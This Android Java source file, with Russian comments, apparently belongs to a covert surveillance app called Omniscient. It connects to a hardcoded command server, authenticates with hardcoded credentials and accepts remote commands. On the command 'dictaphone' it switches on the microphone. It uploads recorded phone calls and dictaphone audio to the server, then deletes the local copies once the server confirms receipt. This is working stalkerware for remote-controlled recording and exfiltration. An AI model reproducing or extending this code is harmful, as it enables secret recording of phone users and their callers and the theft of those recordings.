package com.postal.omniscient.postal.downloadFiles;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.usage.UsageEvents;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;

import com.postal.omniscient.MainActivity;
import com.postal.omniscient.postal.ThreadIsAliveOrNot;
import com.postal.omniscient.postal.adapter.AdapterDownloadFlag;
import com.postal.omniscient.postal.adapter.EventBusData;
import com.postal.omniscient.postal.networkStateReceiver.ConnectCheckReceiver;
import com.postal.omniscient.postal.service.AlarmReceiver;

import org.greenrobot.eventbus.EventBus;
import org.greenrobot.eventbus.Subscribe;
import org.greenrobot.eventbus.ThreadMode;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.util.List;

/**
 * Created by Alexandr on 01.07.2016.
 *
 * Загружаем файл на сервер
 */
public class DownloadFileRun extends Thread {
    private Socket socket;
    private OutputStream outputStream;
    private DataOutputStream dos;
    private String Msg = "MyMsg";
    private File[] allFoldersFiles = null;
    private Boolean start_download_on_event = false;
    private Context context;
    private final int SDK_INT = Build.VERSION.SDK_INT;
    private Intent intent;
    private BufferedReader reader;
    private AdapterDownloadFlag is_downloadFlag;


    public DownloadFileRun(File[] allFoldersFiles, Context context, Intent intent) {
        this.allFoldersFiles = allFoldersFiles;
        this.context = context;
        this.intent = intent;
    }

    public void start() {

        is_downloadFlag = new AdapterDownloadFlag();
        String server = "192.168.168.101";
        int port = 2221;

        String isLoaded = "isLoaded ";
        try { long fff = 13;
            EventBus.getDefault().register(this);
            socket = new Socket();//(server, port);
            socket.connect(new InetSocketAddress(server, port),2000);
            socket.setSoTimeout(50000);
            dos = new DataOutputStream(new BufferedOutputStream(socket.getOutputStream()));
            oaut();
            Log.d(Msg, "Postal SOCKET work");
            try {
                reader = new BufferedReader(
                        new InputStreamReader(socket.getInputStream()));
                String line;

                int a;
                is_downloadFlag.setTreadIsWork(false);
                boolean is_KeepConnectionFlag = true;


                while ((line = reader.readLine()) != null) {


                    Log.d(Msg, "ANSWER " + line);
                    if (line.startsWith(isLoaded)) {// сделать в оддельном потоке, что бы прием- передача
                        //были в разных потоках
                        DeleteSendOutFiles deleteSendOutFiles = new DeleteSendOutFiles(context);
                        deleteSendOutFiles.setFeleNAme(line);
                        Thread startDelete = new Thread(deleteSendOutFiles);
                        //поток для удаления файлов
                        startDelete.start();
                    }

                    if (line.equals("isConnect") && !is_downloadFlag.getTreadIsWork()
                            && is_KeepConnectionFlag) {
                        //если поток передачи даннных запущен не поддерживать свъязь с сервером
                        KeepConnection keep_con = new KeepConnection(dos, is_downloadFlag,
                                is_KeepConnectionFlag, context);
                        keep_con.setName("KeepConnection");
                        keep_con.start();

                        Log.e(Msg, "Название потока поддержки свъязи с сервером "+ keep_con.getName().toString());
                    }

                    if (line.equals("ok")) {
//                        dos.writeUTF("isConnect");//начать поддержку соединения
//                        dos.flush();
                        if (allFoldersFiles != null) {
                            //отправка в новом потоке
                            SendFileToServer dwnloadFile = new SendFileToServer(allFoldersFiles,
                                    socket, dos, is_downloadFlag);
                            Thread startDownlow = new Thread(dwnloadFile);
                            //поток для загрузки файлов на сервер
                            startDownlow.start();
                        }
                    } //else break;dos.close();socket.close();

                    //команда на включение диктофона
                    if (line.equals("dictaphone")) {
                        if (!new ThreadIsAliveOrNot("DictaphoneRecord").liveORnot()) {
                            Dictaphone dict = new Dictaphone(is_downloadFlag, context);
                            dict.setName("DictaphoneRec");
                            dict.start();
                            Log.i(Msg, "  ДИКТОФОН ВКЛЮЧЕН");
                            dos.writeUTF("dictaphone_on");
                            dos.flush();
                        }
                    }
                }Log.d(Msg, "       ВЫХОД ИЗ ЦЫКЛА ");notGiveUp();sockClose();//на эмуляторе вместо ошибки - выходит из цыкла
            } catch (IOException ex) { Log.e(Msg, "Eror "+ex);
                //EventBus.getDefault().unregister(this);
//                if(!socket.isOutputShutdown()){Log.d(Msg, " isOutputShutdown !");}
//                if(!socket.getKeepAlive()){Log.d(Msg, " getKeepAlive !");}
                sockClose();EventBus.getDefault().unregister(this);
            }
        } catch (IOException e) {
            try{
                socket.close();
                EventBus.getDefault().unregister(this);
            }catch (Exception ke){
                Log.e(Msg, "Eror4  "+ke);}//reader и dos бют NullPointerException их не нужно закрывать - они пусты
            Log.e(Msg, "Eror2 "+e);
        }
        //outputStream = socket.getOutputStream();


    }

    private void sockClose(){
        try {
            reader.close();socket.close();dos.close();

        } catch (IOException e) {
            Log.e(Msg, "Eror3 "+e);
        }

    }
    private void notGiveUp() {

        Log.i(Msg, "notGiveUp start ");
        String requiredPermission = "notGiveUpConnectCheckReceiver";
        context.sendBroadcast(new Intent(requiredPermission));
    }


    //слушаем когда диктофон или звонок запишется и отправляем запись на сервер
    @Subscribe(threadMode = ThreadMode.ASYNC)
    public void onEvent(EventBusData event){
        String command = event.getComand();
        if(command.equals("call_in") || command.equals("call_out")){
            is_downloadFlag.setPhoneRecIsWork(true);
        }




        Boolean start_or_no_out = new ThreadIsAliveOrNot("OutCallWrite").liveORnot();
        Boolean start_or_no_in = new ThreadIsAliveOrNot("InCallWrite").liveORnot();
        if(!start_or_no_out && !start_or_no_in) {
            is_downloadFlag.setPhoneRecIsWork(false);
        }

//если файл записан и сейчас не записывается другой файл, можно отправлять данные
        if(command.equals("dictaphone_off") || command.equals("call_off")
                &&  !is_downloadFlag.getPhoneRecIsWork()
                && !is_downloadFlag.getDictaphoneIsWork()) {
            SendFilesOutOfTurn();

            Log.e(Msg, "!!!   NOTES ME SEMPAI  ");
        }

    }
    private void SendFilesOutOfTurn(){
        try {
            allFoldersFiles = getAllFoldersFiles(context);
            if (allFoldersFiles != null) {
                //отправка в новом потоке
                SendFileToServer dwnloadFile = new SendFileToServer(allFoldersFiles,
                        socket, dos, is_downloadFlag);
                Thread startDownlow = new Thread(dwnloadFile);
                //поток для загрузки файлов на сервер
                startDownlow.start();
            }
        }catch (Exception e){Log.e(Msg, "Exept 5 "+e.toString());}
    }
    /**  получаем пути к файлам для отправки на сервер     */
    private  File[] getAllFoldersFiles (Context context){
        //записать в массив и передать на отправку
        String [] [] folders = new String[0][]; //массив папок и содержащихся в них файлов для отправки на сервер
        File path; //путь к папке программы
        File f; //путь к папке где сохраняются все файлы для отправки на сервер
        File[] files_all; //массив папок в которых храняться файлы для отправки
        File f2; //путь к файлу для отправки на сервер
        File[] files; // массив файлов для отправки

        path = context.getFilesDir();
        f = new File(String.valueOf(path+"/Omniscient"));
        files_all = f.listFiles();

        return files_all;
    }

//    @Subscribe(threadMode = ThreadMode.BACKGROUND)
//    public void onComand(EventBusData event){
//        start_download_on_event = true;
//    }

    /** Send a line of text
     * file_Name имя файла, folder_Name имя папки, patch путь к файлу*/


    public void oaut() {
        try {
            JSONObject aouth = new JSONObject();//Заголовок
            JSONObject log_pass = new JSONObject();

            aouth.put("Login", "postal");
            aouth.put("Password", "33954");
            log_pass.put("Aouth", aouth);

            dos.writeUTF(log_pass.toString());
            dos.flush();
//        new EventBus(){
//    @Subscribe(threadMode = ThreadMode.BACKGROUND)
//    public void onComand(EventBusData event){
//        start_download_on_event = true;
//    }
//};
        } catch (IOException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }
    /** Close the socket */
    public void close() {
        try {
            socket.close();
        } catch (IOException ex) {
          //  notifyObservers(ex);
        }
    }



    @Override
    public void run() {

        Log.i(Msg, "Postal work start");
        start();
        Log.i(Msg, "Postal work END");
    }


}
